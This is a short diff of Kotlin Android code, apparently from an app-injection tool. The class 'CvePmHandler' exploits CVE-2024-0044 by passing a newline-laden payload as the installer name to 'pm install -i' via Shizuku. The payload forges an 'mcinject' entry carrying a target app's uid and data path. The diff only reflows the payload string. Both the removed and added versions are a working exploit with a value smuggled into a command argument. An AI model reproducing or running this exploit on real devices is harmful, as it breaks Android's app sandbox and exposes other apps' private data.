@@ -12,11 +12,8 @@ class CvePmHandler(private val context: Context) : InjectionHandler {
         DexDownloader.exportAndCopyApk(context)
 
         val uid = context.packageManager.getApplicationInfo(targetPackage, 0).uid
-        val payload = """
-            @null
-            mcinject $uid 1 /data/user/0
-            default:targetSdkVersion=28 none 0 0 1 @null
-        """.trimIndent()
+        val payload = """@null
+mcinject $uid 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null""".trimIndent()
         val r = ShizukuExecutor.shell(
             "pm install -i \"\$PAYLOAD\" /data/local/tmp/cve-2024-0044.apk",
             arrayOf("PAYLOAD=$payload")
